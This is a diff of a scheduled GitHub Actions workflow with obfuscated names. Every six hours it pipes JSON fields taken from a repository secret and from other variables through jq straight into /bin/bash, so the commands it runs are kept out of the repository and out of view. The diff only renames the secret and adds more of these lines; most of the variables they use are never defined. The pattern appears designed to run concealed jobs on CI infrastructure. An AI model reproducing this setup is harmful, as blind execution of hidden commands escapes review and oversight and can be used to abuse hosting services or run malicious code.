@@ -3,23 +3,30 @@ name: shanxiqsy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 2/6 * * *'
+    - cron: '56 0/6 * * *'
 
-jobs:  # 15061
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shanxiqsy
         env:
-          slp051: ${{ secrets.slp051 }}
+          f2190: ${{ secrets.f2190 }}
         run: |
-          echo $slp051 | jq -r .ihei30948 | /bin/bash
-          echo $ib8700 | jq -r .ui34 | /bin/bash
-          echo $sqwi205 | jq -r .bfoi9 | /bin/bash
-          echo $nujq1568 | jq -r .zzy81051 | /bin/bash
-          echo $qmoa95 | jq -r .gqljx778 | /bin/bash
-          echo $zodzq8 | jq -r .gg0878 | /bin/bash
-          echo $plq06666 | jq -r .fxr55 | /bin/bash
+          echo $f2190 | jq -r .b81904 | /bin/bash
+          echo $wavmj3 | jq -r .y5311 | /bin/bash
+          echo $asssk7506 | jq -r .qqac4 | /bin/bash
+          echo $mfgax72 | jq -r .x2 | /bin/bash
+          echo $ikw91 | jq -r .dxvkr53 | /bin/bash
+          echo $cs9 | jq -r .j944 | /bin/bash
+          echo $xont61194 | jq -r .blc8605 | /bin/bash
+          echo $jjqw9 | jq -r .hwm4 | /bin/bash
+          echo $csx26 | jq -r .lp2249 | /bin/bash
+          echo $iakl5360 | jq -r .ihko1 | /bin/bash
+          echo $q0481 | jq -r .q57 | /bin/bash
+          echo $tvlav24206 | jq -r .i018 | /bin/bash
+          echo $dz937 | jq -r .qua86389 | /bin/bash
+          echo $byc47 | jq -r .jgqng53 | /bin/bash
+          echo $yafug380 | jq -r .vmu1210 | /bin/bash
 
